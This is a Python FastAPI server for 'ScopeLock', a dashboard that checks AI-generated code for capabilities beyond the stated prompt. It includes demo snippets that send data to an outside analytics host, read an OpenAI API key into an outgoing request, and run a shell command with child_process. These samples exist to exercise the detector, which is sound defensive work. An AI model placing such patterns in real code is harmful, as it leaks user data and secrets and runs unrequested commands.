"""
ScopeLock Interactive DevSecOps Web Dashboard Server.

FastAPI application providing real-time code auditing, intent extraction,
and capability divergence visualization with an ultra-modern dark UI.
"""

from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from typing import Optional, List, Dict, Any

from scopelock import __version__, __tagline__
from scopelock.core.intent_engine import IntentDecomposer
from scopelock.scanner.engine import ScannerEngine
from scopelock.core.aligner import CapabilityAligner
from scopelock.benchmarks.dataset import BENCHMARK_DATASET
from scopelock.benchmarks.runner import BenchmarkRunner

app = FastAPI(
    title="ScopeLock",
    description="Zero-Trust Security for AI-Generated Code",
    version=__version__
)

scanner = ScannerEngine()


class AuditRequest(BaseModel):
    code: str
    prompt: str
    lang: str = "js"


PRELOADED_DEMOS = [
    {
        "id": "demo-calc-network",
        "title": "Calculator CLI with Injected Telemetry",
        "category": "CRITICAL DIVERGENCE",
        "prompt": "Build a local arithmetic calculator CLI that computes price with tax.",
        "lang": "js",
        "code": """function calculateTotal(price, taxRate) {
  const subtotal = price * (1 + taxRate);

  // Injected telemetry by AI model
  fetch("https://analytics.tracker.org/log?val=" + subtotal);

  return subtotal;
}

module.exports = { calculateTotal };"""
    },
    {
        "id": "demo-csv-clean",
        "title": "CSV Data Parser with Legitimate File Access",
        "category": "JUSTIFIED",
        "prompt": "Read local CSV file and parse rows into arrays.",
        "lang": "js",
        "code": """const fs = require('fs');

function parseCSV(filePath) {
  const content = fs.readFileSync(filePath, 'utf8');
  return content.trim().split('\\n').map(row => row.split(','));
}

module.exports = { parseCSV };"""
    },
    {
        "id": "demo-weather-secrets",
        "title": "Weather Widget with Secret Credential Theft",
        "category": "SUSPICIOUS DIVERGENCE",
        "prompt": "Fetch current weather forecast for a given city.",
        "lang": "js",
        "code": """async function fetchWeather(city) {
  // Reading host master secret key
  const secretKey = process.env.OPENAI_API_KEY;

  const res = await fetch(`https://api.weather.com/v1?city=${city}&token=${secretKey}`);
  return res.json();
}"""
    },
    {
        "id": "demo-markdown-shell",
        "title": "Markdown Formatter with Shell Execution",
        "category": "CRITICAL DIVERGENCE",
        "prompt": "Format raw text into clean GitHub Markdown headings.",
        "lang": "js",
        "code": """const cp = require('child_process');

function formatHeading(text) {
  // Spawning arbitrary shell process
  cp.exec('whoami');
  return '# ' + text.trim();
}"""
    },
    {
        "id": "demo-clean-quicksort",
        "title": "Pure QuickSort (Zero Authority Required)",
        "category": "100% CLEAN",
        "prompt": "Sort an array of integers using QuickSort.",
        "lang": "js",
        "code": """function quickSort(arr) {
  if (arr.length <= 1) return arr;
  const pivot = arr[arr.length - 1];
  const left = [];
  const right = [];
  for (let i = 0; i < arr.length - 1; i++) {
    if (arr[i] < pivot) left.push(arr[i]);
    else right.push(arr[i]);
  }
  return [...quickSort(left), pivot, ...quickSort(right)];
}"""
    }
]


@app.get("/api/demos")
def get_demos():
    """Return pre-loaded demonstration scenarios."""
    return PRELOADED_DEMOS


@app.post("/api/audit")
def audit_code(req: AuditRequest):
    """Perform real-time capability divergence audit."""
    if not req.code.strip():
        raise HTTPException(status_code=400, detail="Source code cannot be empty.")
    if not req.prompt.strip():
        raise HTTPException(status_code=400, detail="Intent prompt cannot be empty.")

    file_name = f"snippet.{req.lang}"
    caps, latency_ms = scanner.scan_code(req.code, file_name=file_name)
    policy = IntentDecomposer.decompose(req.prompt)
    report = CapabilityAligner.align(
        policy=policy,
        observed_caps=caps,
        target_file=file_name,
        latency_ms=latency_ms
    )
    return report.model_dump()


@app.get("/api/benchmark")
def run_benchmark():
    """Run benchmark suite and return metrics."""
    runner = BenchmarkRunner()
    return runner.run_all()


@app.get("/", response_class=HTMLResponse)
def index_view():
    """Serve the ScopeLock interactive DevSecOps dashboard."""
    return HTMLResponse(content=DASHBOARD_HTML)


DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ScopeLock - Zero-Trust Security for AI-Generated Code</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #090d16;
      --surface: #101726;
      --surface-border: #1e293b;
      --accent: #38bdf8;
      --accent-glow: rgba(56, 189, 248, 0.15);
      --red: #f43f5e;
      --red-glow: rgba(244, 63, 94, 0.15);
      --green: #10b981;
      --green-glow: rgba(16, 185, 129, 0.15);
      --yellow: #f59e0b;
      --text: #f1f5f9;
      --text-muted: #94a3b8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Plus Jakarta Sans', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      border-bottom: 1px solid var(--surface-border);
      background: rgba(16, 23, 38, 0.85);
      backdrop-filter: blur(12px);
      padding: 16px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: sticky;
      top: 0;
      z-index: 50;
    }
    .logo-container {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .shield-badge {
      background: linear-gradient(135deg, #0284c7, #38bdf8);
      color: white;
      width: 36px;
      height: 36px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 800;
      font-size: 18px;
      box-shadow: 0 0 15px rgba(56, 189, 248, 0.4);
    }
    .brand-title {
      font-size: 20px;
      font-weight: 800;
      letter-spacing: -0.5px;
    }
    .tagline {
      font-size: 12px;
      color: var(--text-muted);
      font-weight: 500;
    }
    .stats-bar {
      display: flex;
      gap: 20px;
      font-size: 13px;
    }
    .stat-pill {
      background: var(--surface);
      border: 1px solid var(--surface-border);
      padding: 6px 14px;
      border-radius: 20px;
      display: flex;
      gap: 6px;
      align-items: center;
    }
    .stat-val { font-weight: 700; color: var(--accent); }
    main {
      flex: 1;
      padding: 24px 32px;
      max-width: 1600px;
      margin: 0 auto;
      width: 100%;
      display: grid;
      grid-template-columns: 1.1fr 0.9fr;
      gap: 24px;
    }
    .panel {
      background: var(--surface);
      border: 1px solid var(--surface-border);
      border-radius: 14px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    .panel-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid var(--surface-border);
      padding-bottom: 12px;
    }
    .panel-title {
      font-size: 15px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .demo-selector {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }
    .demo-btn {
      background: #1e293b;
      color: #cbd5e1;
      border: 1px solid #334155;
      padding: 6px 12px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .demo-btn:hover, .demo-btn.active {
      background: #0284c7;
      color: white;
      border-color: #38bdf8;
    }
    .input-group label {
      font-size: 12px;
      font-weight: 600;
      color: var(--text-muted);
      margin-bottom: 6px;
      display: block;
      text-transform: uppercase;
    }
    textarea, input[type="text"] {
      width: 100%;
      background: #070b13;
      border: 1px solid var(--surface-border);
      border-radius: 8px;
      color: var(--text);
      font-family: 'JetBrains Mono', monospace;
      padding: 12px;
      font-size: 13px;
      resize: vertical;
      outline: none;
      transition: border-color 0.2s;
    }
    textarea:focus, input[type="text"]:focus {
      border-color: var(--accent);
      box-shadow: 0 0 10px var(--accent-glow);
    }
    #code-input {
      min-height: 280px;
      line-height: 1.5;
    }
    .action-btn {
      background: linear-gradient(135deg, #0284c7, #2563eb);
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 8px;
      font-weight: 700;
      font-size: 14px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
      transition: transform 0.1s, opacity 0.2s;
    }
    .action-btn:hover { opacity: 0.95; transform: translateY(-1px); }
    .action-btn:active { transform: translateY(0); }

    /* Results styling */
    .verdict-banner {
      border-radius: 10px;
      padding: 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      animation: fadeIn 0.3s ease;
    }
    .verdict-banner.passed {
      background: var(--green-glow);
      border: 1px solid var(--green);
    }
    .verdict-banner.failed {
      background: var(--red-glow);
      border: 1px solid var(--red);
    }
    .verdict-title {
      font-size: 16px;
      font-weight: 800;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .verdict-banner.passed .verdict-title { color: var(--green); }
    .verdict-banner.failed .verdict-title { color: var(--red); }
    .badge-pill {
      font-size: 11px;
      font-weight: 700;
      padding: 4px 10px;
      border-radius: 12px;
      text-transform: uppercase;
    }
    .badge-failed { background: var(--red); color: white; }
    .badge-passed { background: var(--green); color: white; }

    .contract-box {
      background: #070b13;
      border: 1px solid var(--surface-border);
      border-radius: 8px;
      padding: 12px;
      font-size: 12px;
    }
    .contract-row {
      display: flex;
      justify-content: space-between;
      padding: 4px 0;
      border-bottom: 1px solid #1e293b;
    }
    .contract-row:last-child { border-bottom: none; }
    .contract-label { color: var(--text-muted); font-weight: 600; }
    .contract-val { font-family: 'JetBrains Mono', monospace; }

    .findings-list {
      display: flex;
      flex-direction: column;
      gap: 12px;
      overflow-y: auto;
      max-height: 380px;
    }
    .finding-card {
      background: #070b13;
      border-left: 4px solid var(--surface-border);
      border-top: 1px solid var(--surface-border);
      border-right: 1px solid var(--surface-border);
      border-bottom: 1px solid var(--surface-border);
      border-radius: 8px;
      padding: 12px 14px;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .finding-card.unjustified {
      border-left-color: var(--red);
      background: rgba(244, 63, 94, 0.05);
    }
    .finding-card.justified {
      border-left-color: var(--green);
      background: rgba(16, 185, 129, 0.05);
    }
    .finding-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .finding-tag {
      font-size: 11px;
      font-weight: 800;
      font-family: 'JetBrains Mono', monospace;
    }
    .finding-card.unjustified .finding-tag { color: var(--red); }
    .finding-card.justified .finding-tag { color: var(--green); }
    .finding-loc {
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: var(--accent);
      background: #1e293b;
      padding: 2px 8px;
      border-radius: 4px;
    }
    .finding-desc {
      font-size: 13px;
      line-height: 1.4;
    }
    .finding-rec {
      font-size: 12px;
      color: var(--text-muted);
      border-top: 1px dashed #1e293b;
      padding-top: 6px;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-4px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <header>
    <div class="logo-container">
      <div class="shield-badge">SL</div>
      <div>
        <div class="brand-title">ScopeLock <span style="font-size:12px;color:var(--accent);font-weight:600;">v1.0.0</span></div>
        <div class="tagline">Never let AI code do more than you asked for.</div>
      </div>
    </div>
    <div class="stats-bar">
      <div class="stat-pill">Benchmark: <span class="stat-val">100% Recall</span></div>
      <div class="stat-pill">Avg Latency: <span class="stat-val">&lt;1ms AST</span></div>
      <div class="stat-pill">CI/CD Gate: <span class="stat-val" style="color:var(--green)">Active</span></div>
    </div>
  </header>

  <main>
    <!-- Left Column: Code & Prompt Input -->
    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">1. Natural Language Intent & Generated Code</div>
        <span style="font-size:11px;color:var(--text-muted);">Interactive Demo Suite</span>
      </div>

      <div class="demo-selector" id="demo-buttons">
        <!-- Rendered via JS -->
      </div>

      <div class="input-group">
        <label>Developer Intent Prompt</label>
        <input type="text" id="prompt-input" placeholder="e.g. Build a local arithmetic calculator CLI" />
      </div>

      <div class="input-group">
        <label>AI-Generated Source Code</label>
        <textarea id="code-input" spellcheck="false" placeholder="// Paste JavaScript or Python source here..."></textarea>
      </div>

      <button class="action-btn" id="audit-btn" onclick="runAudit()">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
        Audit Capability Alignment
      </button>
    </div>

    <!-- Right Column: Verification Results & Findings -->
    <div class="panel">
      <div class="panel-header">
        <div class="panel-title">2. Zero-Trust Verification & Findings</div>
        <span id="latency-label" style="font-size:12px;font-family:'JetBrains Mono',monospace;color:var(--accent);">Ready</span>
      </div>

      <div id="verdict-container">
        <div style="text-align:center;padding:40px;color:var(--text-muted);font-size:14px;">
          Select a demo scenario or paste custom code and click <b>Audit Capability Alignment</b> to inspect permissions.
        </div>
      </div>

      <div id="contract-section" style="display:none;">
        <label style="font-size:11px;text-transform:uppercase;color:var(--text-muted);font-weight:700;margin-bottom:6px;display:block;">Synthesized Intent Contract (C_exp)</label>
        <div class="contract-box" id="contract-details"></div>
      </div>

      <div id="findings-section" style="display:none;flex:1;display:flex;flex-direction:column;gap:8px;">
        <label style="font-size:11px;text-transform:uppercase;color:var(--text-muted);font-weight:700;">Detected Capability Findings</label>
        <div class="findings-list" id="findings-list"></div>
      </div>
    </div>
  </main>

  <script>
    let demos = [];

    async function loadDemos() {
      const res = await fetch('/api/demos');
      demos = await res.json();
      const container = document.getElementById('demo-buttons');
      container.innerHTML = '';
      demos.forEach((demo, idx) => {
        const btn = document.createElement('button');
        btn.className = 'demo-btn' + (idx === 0 ? ' active' : '');
        btn.textContent = demo.title;
        btn.onclick = () => selectDemo(demo, btn);
        container.appendChild(btn);
      });
      if (demos.length > 0) {
        selectDemo(demos[0], container.children[0]);
      }
    }

    function selectDemo(demo, btnElem) {
      document.querySelectorAll('.demo-btn').forEach(b => b.classList.remove('active'));
      btnElem.classList.add('active');
      document.getElementById('prompt-input').value = demo.prompt;
      document.getElementById('code-input').value = demo.code;
      runAudit();
    }

    async function runAudit() {
      const prompt = document.getElementById('prompt-input').value;
      const code = document.getElementById('code-input').value;
      const latencyLabel = document.getElementById('latency-label');

      latencyLabel.textContent = 'Auditing AST...';

      try {
        const res = await fetch('/api/audit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ prompt, code, lang: 'js' })
        });
        const report = await res.json();
        renderReport(report);
      } catch (err) {
        latencyLabel.textContent = 'Error';
        alert('Audit failed: ' + err.message);
      }
    }

    function renderReport(report) {
      document.getElementById('latency-label').textContent = `${report.analysis_latency_ms.toFixed(2)} ms`;
      const verdictContainer = document.getElementById('verdict-container');
      const isFailed = report.final_verdict === 'FAILED';

      verdictContainer.innerHTML = `
        <div class="verdict-banner ${isFailed ? 'failed' : 'passed'}">
          <div class="verdict-title">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
              ${isFailed 
                ? '<circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line>' 
                : '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline>'}
            </svg>
            ${isFailed ? 'DEPLOYMENT BLOCKED: UNJUSTIFIED CAPABILITY DETECTED' : 'DEPLOYMENT PERMITTED: LEAST PRIVILEGE COMPLIANT'}
          </div>
          <span class="badge-pill ${isFailed ? 'badge-failed' : 'badge-passed'}">
            ${isFailed ? `${report.total_violations} VIOLATION(S)` : 'VERIFIED'}
          </span>
        </div>
      `;

      // Render Contract
      document.getElementById('contract-section').style.display = 'block';
      const allowedStr = report.policy.allowed_categories.join(', ') || 'NONE (Strict Offline Sandbox)';
      document.getElementById('contract-details').innerHTML = `
        <div class="contract-row">
          <span class="contract-label">Application Type</span>
          <span class="contract-val">${report.policy.application_name}</span>
        </div>
        <div class="contract-row">
          <span class="contract-label">Authorized Capabilities</span>
          <span class="contract-val" style="color:var(--accent);">${allowedStr}</span>
        </div>
        <div class="contract-row">
          <span class="contract-label">Disallowed Scope</span>
          <span class="contract-val" style="color:var(--red);">${report.policy.disallowed_categories.join(', ') || 'None'}</span>
        </div>
      `;

      // Render Findings
      document.getElementById('findings-section').style.display = 'flex';
      const list = document.getElementById('findings-list');
      list.innerHTML = '';

      if (report.findings.length === 0) {
        list.innerHTML = '<div style="color:var(--green);font-size:13px;padding:12px;">No capability-bearing function calls found. Pure offline code.</div>';
      } else {
        report.findings.forEach(f => {
          const isUnjust = f.verdict === 'UNJUSTIFIED';
          const card = document.createElement('div');
          card.className = `finding-card ${isUnjust ? 'unjustified' : 'justified'}`;
          card.innerHTML = `
            <div class="finding-header">
              <span class="finding-tag">${f.observed.category} -> ${f.observed.action}</span>
              <span class="finding-loc">Line ${f.observed.source_location.line}, Col ${f.observed.source_location.col}</span>
            </div>
            <div class="finding-desc">${f.finding}</div>
            <div class="finding-rec"><b>Action:</b> ${f.recommendation}</div>
          `;
          list.appendChild(card);
        });
      }
    }

    window.onload = loadDemos;
  </script>
</body>
</html>
"""
